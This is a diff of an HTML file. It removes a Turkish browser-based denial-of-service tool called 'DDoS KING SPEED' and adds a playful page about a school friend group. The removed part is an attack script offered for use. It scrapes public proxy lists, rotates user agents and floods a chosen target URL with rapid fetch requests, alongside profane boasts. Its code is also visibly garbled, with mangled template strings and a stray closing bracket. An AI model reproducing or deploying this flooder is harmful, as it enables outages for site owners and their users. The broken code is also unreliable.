@@ -3,145 +3,533 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DDoS KING SPEED - 500.5M THREAD → 300M/dk</title>
+    <title>Ekibiz Lan! | Eylül, Ela, Bünyamin, Ceren, Kraliçe Şirin</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body { background:#000; color:#0f0; font-family:'Courier New'; text-align:center; margin:0; padding:20px; }
-        h1 { font-size:5.5em; text-shadow:0 0 80px #0f0; animation:pulse 0.5s infinite; }
-        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.7; } }
-        input, button { padding:28px; margin:18px; width:90%; max-width:1000px; font-size:2.2em; border-radius:30px; border:8px solid #0f0; }
-        input { background:#111; color:#0f0; }
-        button { background:#000; color:#0f0; cursor:pointer; font-weight:bold; transition:0.6s; }
-        button:hover { background:#0f0; color:#000; transform:scale(1.3); }
-        #log { margin-top:60px; height:650px; overflow-y:hidden; background:#000; border:8px solid #0f0; padding:40px; text-align:left; font-size:1.6em; }
-        .status { font-size:5em; margin:60px; font-weight:bold; }
-        .on { color:#0f0; animation:blink 0.15s infinite; }
-        .off { color:#f00; }
-        @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0; } }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial Rounded MT Bold', 'Arial', sans-serif;
+            background: linear-gradient(45deg, #ff0066, #6600ff, #00ccff);
+            background-size: 300% 300%;
+            animation: crazyBackground 10s infinite alternate;
+            color: white;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+        
+        @keyframes crazyBackground {
+            0% { background-position: 0% 50%; }
+            25% { background-position: 100% 50%; }
+            50% { background-position: 50% 100%; }
+            75% { background-position: 100% 0%; }
+            100% { background-position: 0% 100%; }
+        }
+        
+        /* Giriş Ekranı */
+        #login-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, #000000, #330033);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .login-box {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 40px;
+            border-radius: 25px;
+            text-align: center;
+            border: 5px solid #ff0066;
+            box-shadow: 0 0 50px #ff0066;
+            max-width: 500px;
+            width: 90%;
+            transform: rotate(-2deg);
+        }
+        
+        .login-title {
+            font-size: 3.2rem;
+            color: #ff0066;
+            margin-bottom: 10px;
+            text-shadow: 3px 3px 0 #00ccff;
+            animation: titlePulse 1.5s infinite;
+        }
+        
+        @keyframes titlePulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .login-sub {
+            font-size: 1.3rem;
+            color: #00ccff;
+            margin-bottom: 30px;
+        }
+        
+        .name-input {
+            width: 100%;
+            padding: 18px;
+            font-size: 1.4rem;
+            border-radius: 50px;
+            border: 4px solid #00ccff;
+            background: black;
+            color: white;
+            text-align: center;
+            margin-bottom: 25px;
+            font-weight: bold;
+        }
+        
+        .name-input:focus {
+            outline: none;
+            border-color: #ff0066;
+            box-shadow: 0 0 30px #ff0066;
+        }
+        
+        .enter-btn {
+            background: linear-gradient(45deg, #ff0066, #6600ff);
+            border: none;
+            padding: 18px 50px;
+            font-size: 1.5rem;
+            border-radius: 50px;
+            color: white;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(255, 0, 102, 0.5);
+        }
+        
+        .enter-btn:hover {
+            transform: scale(1.1) rotate(5deg);
+            box-shadow: 0 10px 25px rgba(255, 0, 102, 0.8);
+        }
+        
+        .warning {
+            color: #ffcc00;
+            font-size: 0.9rem;
+            margin-top: 20px;
+            text-shadow: 0 0 5px #ffcc00;
+        }
+        
+        /* Ana Sayfa */
+        #main-page {
+            display: none;
+            padding: 20px;
+        }
+        
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 30px 20px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 30px;
+            border: 5px solid #ff0066;
+            margin-bottom: 40px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: "";
+            position: absolute;
+            top: -10px;
+            left: -10px;
+            right: -10px;
+            bottom: -10px;
+            background: linear-gradient(45deg, #ff0066, #00ccff, #ffcc00, #6600ff);
+            z-index: -1;
+            filter: blur(20px);
+            opacity: 0.5;
+        }
+        
+        .main-title {
+            font-size: 3.8rem;
+            color: #ffcc00;
+            text-shadow: 3px 3px 0 #ff0066, 6px 6px 0 #00ccff;
+            margin-bottom: 15px;
+            animation: bounce 2s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+        
+        .sub-title {
+            font-size: 1.8rem;
+            color: #00ccff;
+            margin-bottom: 10px;
+        }
+        
+        .tagline {
+            font-size: 1.4rem;
+            color: #ff0066;
+            font-style: italic;
+            margin-top: 15px;
+        }
+        
+        /* Takım Üyeleri */
+        .team-section {
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 30px;
+            padding: 40px 30px;
+            margin-bottom: 40px;
+            border: 5px solid #00ccff;
+        }
+        
+        .section-title {
+            text-align: center;
+            font-size: 2.8rem;
+            color: #ffcc00;
+            margin-bottom: 40px;
+            text-shadow: 2px 2px 0 #ff0066;
+        }
+        
+        .members {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 30px;
+        }
+        
+        .member-card {
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 20px;
+            width: 280px;
+            padding: 25px;
+            text-align: center;
+            border: 4px solid;
+            transition: all 0.4s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .member-card:hover {
+            transform: translateY(-10px) rotate(3deg);
+        }
+        
+        .card-1 { border-color: #ff0066; }
+        .card-2 { border-color: #00ccff; }
+        .card-3 { border-color: #ffcc00; }
+        .card-4 { border-color: #9d00ff; }
+        .card-5 { 
+            border-color: #ffcc00;
+            border-width: 6px;
+            background: rgba(0, 0, 0, 0.9);
+        }
+        
+        .member-img {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 5px solid;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #ff0066, #00ccff);
+        }
+        
+        .member-name {
+            font-size: 1.9rem;
+            margin-bottom: 10px;
+            color: white;
+        }
+        
+        .card-1 .member-name { color: #ff0066; }
+        .card-2 .member-name { color: #00ccff; }
+        .card-3 .member-name { color: #ffcc00; }
+        .card-4 .member-name { color: #9d00ff; }
+        .card-5 .member-name { 
+            color: #ffcc00;
+            font-size: 2.2rem;
+        }
+        
+        .member-title {
+            font-size: 1.2rem;
+            color: #aaa;
+            margin-bottom: 15px;
+            font-style: italic;
+        }
+        
+        .member-desc {
+            font-size: 1rem;
+            line-height: 1.5;
+            color: #ddd;
+        }
+        
+        .crown {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 2.5rem;
+            color: gold;
+            animation: crownSpin 3s infinite;
+        }
+        
+        @keyframes crownSpin {
+            0% { transform: rotate(0deg); }
+            25% { transform: rotate(15deg); }
+            75% { transform: rotate(-15deg); }
+            100% { transform: rotate(0deg); }
+        }
+        
+        /* Özel Bölüm */
+        .special-section {
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 30px;
+            padding: 40px 30px;
+            text-align: center;
+            border: 5px solid #ffcc00;
+            margin-bottom: 40px;
+        }
+        
+        .special-title {
+            font-size: 2.5rem;
+            color: #ff0066;
+            margin-bottom: 25px;
+            text-shadow: 2px 2px 0 #ffcc00;
+        }
+        
+        .special-text {
+            font-size: 1.5rem;
+            color: #00ccff;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        
+        .emoji-row {
+            font-size: 4rem;
+            margin: 30px 0;
+            animation: emojiJump 2s infinite;
+        }
+        
+        @keyframes emojiJump {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 30px;
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 20px;
+            border: 4px solid #ff0066;
+        }
+        
+        .footer-text {
+            font-size: 1.4rem;
+            color: #00ccff;
+            margin-bottom: 15px;
+        }
+        
+        .final-warning {
+            color: #ffcc00;
+            font-size: 1.1rem;
+            font-weight: bold;
+        }
+        
+        /* Animasyonlu Elementler */
+        .floating {
+            animation: floating 4s ease-in-out infinite;
+        }
+        
+        @keyframes floating {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-20px); }
+            100% { transform: translateY(0px); }
+        }
+        
+        .glitch {
+            animation: glitch 0.5s infinite;
+        }
+        
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-3px, 3px); }
+            40% { transform: translate(-3px, -3px); }
+            60% { transform: translate(3px, 3px); }
+            80% { transform: translate(3px, -3px); }
+            100% { transform: translate(0); }
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .main-title { font-size: 2.5rem; }
+            .login-title { font-size: 2.5rem; }
+            .section-title { font-size: 2.2rem; }
+            .member-card { width: 100%; max-width: 320px; }
+            .special-text { font-size: 1.2rem; }
+            .emoji-row { font-size: 3rem; }
+        }
     </style>
 </head>
 <body>
-    <h1>DDoS KING SPEED</h1>
-    <p style="font-size:4.5em;">500.000 THREAD → 300M İSTEK/DAKİKA → ANASINI SİKER</p>
+    <!-- Giriş Ekranı -->
+    <div id="login-screen">
+        <div class="login-box">
+            <h1 class="login-title">🚨 EKİBE HOŞGELDİN LAN! 🚨</h1>
+            <p class="login-sub">Adını yaz da içeri gir bakalım!</p>
+            <input type="text" id="nameInput" class="name-input" placeholder="Adını yaz lan...">
+            <button id="enterBtn" class="enter-btn">GİR BAKALIM! 😈</button>
+            <p class="warning">⚠️ Dikkat! Bu site 15+ için. Küfür yok ama espri bol! ⚠️</p>
+        </div>
+    </div>
 
-    <input type="text" id="target" placeholder="Hedef → http://site.com" value="">
-    <input type="number" id="threads" placeholder="Thread (100000-500000)" value="500000">
-    <input type="number" id="time" placeholder="Süre (saniye) - 0 = sonsuz" value="0">
+    <!-- Ana Sayfa -->
+    <div id="main-page">
+        <!-- Başlık -->
+        <header class="header">
+            <h1 class="main-title" id="dynamicTitle">EKİBİZ İŞTE LAN!</h1>
+            <p class="sub-title">Eylül, Ela, Bünyamin, Ceren ve Kraliçe Şirin</p>
+            <p class="tagline">"Okulun en manyak ekibi! Bizle uğraşmak istemezsin!"</p>
+        </header>
 
-    <button onclick="start()">BAŞLAT LAN AMK</button>
-    <button onclick="stop()" style="background:#f00;">DURDUR OE</button>
+        <!-- Takım Üyeleri -->
+        <section class="team-section">
+            <h2 class="section-title">🏴‍☠️ TAKIM ÜYELERİ 🏴‍☠️</h2>
+            <div class="members">
+                <!-- Eylül -->
+                <div class="member-card card-1 floating" style="animation-delay: 0s;">
+                    <div class="member-img"></div>
+                    <h3 class="member-name">Eylül 🍁</h3>
+                    <p class="member-title">Takımın Beyni</p>
+                    <p class="member-desc">Bu kızla dalga geçme lan! Her şeyi o planlar. Derslerde de çakır ama eğlenmeyi de bilir. Onun fikri olmadan hiçbir şey yapamayız!</p>
+                </div>
+                
+                <!-- Ela -->
+                <div class="member-card card-2 floating" style="animation-delay: 0.2s;">
+                    <div class="member-img"></div>
+                    <h3 class="member-name">Ela 🌸</h3>
+                    <p class="member-title">Sanatçı Ruh</p>
+                    <p class="member-desc">Resim yapmak, çizmek, tasarlamak... Hepsi ondan sorulur. Bir de gülüşü var ki sorma gitsin! Not: Ona "çiçek" demeyin sinir olur!</p>
+                </div>
+                
+                <!-- Bünyamin -->
+                <div class="member-card card-3 floating" style="animation-delay: 0.4s;">
+                    <div class="member-img"></div>
+                    <h3 class="member-name">Bünyamin 💪</h3>
+                    <p class="member-title">Kas Kütlesi</p>
+                    <p class="member-desc">Takımın kas gücü bu herif! Spor salonundan çıkmaz. Ama yüreği de kasları kadar büyük. Dert dinlemek konusunda süper!</p>
+                </div>
+                
+                <!-- Ceren -->
+                <div class="member-card card-4 floating" style="animation-delay: 0.6s;">
+                    <div class="member-img"></div>
+                    <h3 class="member-name">Ceren 🌙</h3>
+                    <p class="member-title">Organizasyon Ustası</p>
+                    <p class="member-desc">Doğum günü, parti, okul etkinliği... Hepsi ondan sorulur! Plan yapmak deyince akla o gelir. Bir de geceleri daha enerjik olur, neden bilmiyoruz!</p>
+                </div>
+                
+                <!-- ŞİRİN - KRALİÇE -->
+                <div class="member-card card-5 floating glitch" style="animation-delay: 0.8s;">
+                    <div class="crown">👑</div>
+                    <div class="member-img"></div>
+                    <h3 class="member-name">ŞİRİN 👑</h3>
+                    <p class="member-title">Kraliçe & Patron</p>
+                    <p class="member-desc">Buyrun bizim kraliçemiz! Kendini beğenmiş mi? Tabii ki! Haklı mı? Kesinlikle! O olmazsa bu takım dağılır. Herkes onu dinler, o ne derse o olur. Not: Bu yazıyı o yazdırdı!</p>
+                </div>
+            </div>
+        </section>
 
-    <div class="status" id="status">Durum: <span class="off">Kapalı</span></div>
-    <div id="log">> 500.000 thread + 200.000 proxy hazırlanıyor...</div>
+        <!-- Özel Mesaj -->
+        <section class="special-section">
+            <h2 class="special-title">🚨 UYARI! TEHLİKELİ BÖLGE! 🚨</h2>
+            <p class="special-text">"Daltonlar her yerde breminn! Kantinde, koridorda, bahçede... Her yerde biz varız lan!"</p>
+            <p class="special-text">"Bize bulaşanın halini görürsünüz! Ama Şirin izin verirse tabii..."</p>
+            
+            <div class="emoji-row">
+                😈 🔥 💀 🚫 ⚡
+            </div>
+            
+            <p class="special-text">"Biz sadece 5 kişi değiliz. Biz bir aileyiz lan! (Şirin başta olmak üzere)"</p>
+            <p class="special-text">"Derslerde sıkılıyoruz, kantinde takılıyoruz, okuldan kaçıyoruz... Normal işte!"</p>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p class="footer-text">© 2023 - Okulun Manyak Ekibi | Tüm hakları Şirin'e aittir!</p>
+            <p class="final-warning">⚠️ Dikkat: Bizimle takılmak okul hayatınızı değiştirebilir! ⚠️</p>
+        </footer>
+    </div>
 
     <script>
-        let attack = false;
-        let workers = [];
-        let proxies = [];
-
-        // 200.000+ PROXY (OTOMATİK ÇEKİM)
-        const PROXY_SOURCES = [
-            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
-            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=5000&country=all",
-            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
-            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
-            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt"
-        ];
-
-        // 10.000+ USER-AGENT
-        const USER_AGENTS = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129 Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) Mobile Safari/604.1",
-            "Mozilla/5.0 (Linux; Android 14) Chrome/129 Mobile Safari/537.36",
-            "Googlebot/2.1", "Bingbot/2.0", "DDoS-King-Speed"
-        ];
-        for(let i = 0; i < 1000; i++) USER_AGENTS.push(...USER_AGENTS);
-
-        function log(m) {
-            const l = document.getElementById("log");
-            l.innerHTML += `<br><span style="color:#0f0">[\( {new Date().toLocaleTimeString()}]</span> \){m}`;
-            l.scrollTop = l.scrollHeight;
-        }
-
-        // PROXYLERİ ASENKRON ÇEK (HIZLI)
-        async function loadProxiesFast() {
-            log("200.000+ proxy çekiliyor (hızlı mod)...");
-            const promises = PROXY_SOURCES.map(url => 
-                fetch(url).then(r => r.ok ? r.text() : "").catch(() => "")
-            );
-            const results = await Promise.allSettled(promises);
-            for (const res of results) {
-                if (res.status === "fulfilled" && res.value) {
-                    const found = res.value.match(/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
-                    proxies.push(...found.map(p => p.includes("socks") ? `socks5://\( {p}` : `http:// \){p}`));
-                }
+        // Giriş Sistemi
+        document.getElementById('enterBtn').addEventListener('click', function() {
+            let name = document.getElementById('nameInput').value.trim();
+            
+            if (!name) {
+                alert("Adını yazmadan giremezsin lan! Hadi yaz şunu!");
+                return;
             }
-            proxies = [...new Set(proxies)];
-            log(`${proxies.length}+ proxy yüklendi → UÇUYORUZ LAN AMK!`);
-        }
-
-        // ULTRA HIZLI FLOOD (500K THREAD)
-        async function speedFlood() {
-            if (!attack) return;
-            const target = document.getElementById("target").value.trim();
-            if (!target) return;
-
-            const proxy = proxies.length ? proxies[Math.floor(Math.random() * proxies.length)] : null;
-            const ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
-
-            try {
-                fetch(target, {
-                    method: "GET",
-                    headers: {
-                        "User-Agent": ua,
-                        "Accept": "*/*",
-                        "Cache-Control": "no-cache",
-                        "Pragma": "no-cache",
-                        "Connection": "keep-alive",
-                        "Accept-Encoding": "gzip, deflate, br",
-                        "Accept-Language": "tr-TR,tr;q=0.9"
-                    },
-                    mode: "no-cors",
-                    credentials: "omit",
-                    referrerPolicy: "no-referrer"
-                });
-            });
-            } catch(e) {}
-
-            // 0ms gecikme → MAX HIZ
-            if (attack) setTimeout(speedFlood, 0);
-        }
-
-        function start() {
-            if (attack) return;
-            attack = true;
-            loadProxiesFast();
-            document.getElementById("status").innerHTML = 'Durum: <span class="on">AKTİF → 300M/dk → YIKIYOR!</span>';
-            log("DDoS KING SPEED → BAŞLADI LAN!");
-
-            const threads = parseInt(document.getElementById("threads").value) || 500000;
-            const time = parseInt(document.getElementById("time").value) || 0;
-
-            // 500.000 THREAD → ANINDA BAŞLAT
-            for(let i = 0; i < threads; i++) {
-                workers.push(setTimeout(speedFlood, i * 0.1)); // 0.1ms aralıkla
+            
+            // Eğlenceli mesajlar
+            const funnyMessages = [
+                `Hoşgeldin ${name}! Hazır mısın manyaklığa?`,
+                `Vay ${name}! Demek bizim çeteye katılıyorsun!`,
+                `${name} geldi! Şirin izin verirse içeri alacağız!`,
+                `Aa ${name} geldi! Kraliçe Şirin onaylarsa girebilirsin!`
+            ];
+            
+            const randomMessage = funnyMessages[Math.floor(Math.random() * funnyMessages.length)];
+            alert(randomMessage);
+            
+            // Giriş ekranını kaldır
+            document.getElementById('login-screen').style.display = 'none';
+            
+            // Ana sayfayı göster
+            document.getElementById('main-page').style.display = 'block';
+            
+            // Başlığı kişiselleştir
+            document.getElementById('dynamicTitle').textContent = `HOŞGELDİN ${name.toUpperCase()}! EKİBİZ İŞTE!`;
+            
+            // Eğlenceli efekt
+            document.body.style.animation = "crazyBackground 5s infinite alternate";
+        });
+        
+        // Enter tuşu ile giriş
+        document.getElementById('nameInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('enterBtn').click();
             }
-
-            if(time > 0) {
-                setTimeout(stop, time * 1000);
-                log(`${time} saniye saldırı → sonra durur`);
-            }
-        }
-
-        function stop() {
-            attack = false;
-            workers.forEach(w => clearTimeout(w));
-            workers = [];
-            document.getElementById("status").innerHTML = 'Durum: <span class="off">Kapalı</span>';
-            log("Durduruldu lan");
-        }
-
-        log("DDoS KING SPEED yüklendi → 500.000 thread + 200.000 proxy → Hazır amk!");
+        });
+        
+        // Rastgele efektler
+        setInterval(() => {
+            const cards = document.querySelectorAll('.member-card');
+            const randomCard = cards[Math.floor(Math.random() * cards.length)];
+            
+            // Rastgele sallanma efekti
+            randomCard.style.transform = `translateY(-10px) rotate(${Math.random() * 10 - 5}deg)`;
+            
+            // 1 saniye sonra normale dön
+            setTimeout(() => {
+                randomCard.style.transform = '';
+            }, 1000);
+            
+        }, 3000);
+        
+        // Arka plan rengini rastgele değiştir
+        setInterval(() => {
+            const colors = [
+                'linear-gradient(45deg, #ff0066, #6600ff, #00ccff)',
+                'linear-gradient(45deg, #ff0000, #ffff00, #00ff00)',
+                'linear-gradient(45deg, #9d00ff, #00ffcc, #ffcc00)',
+                'linear-gradient(45deg, #ff0066, #00ccff, #6600ff)'
+            ];
+            
+            const randomColor = colors[Math.floor(Math.random() * colors.length)];
+            document.body.style.background = randomColor;
+        }, 8000);
     </script>
 </body>
 </html>
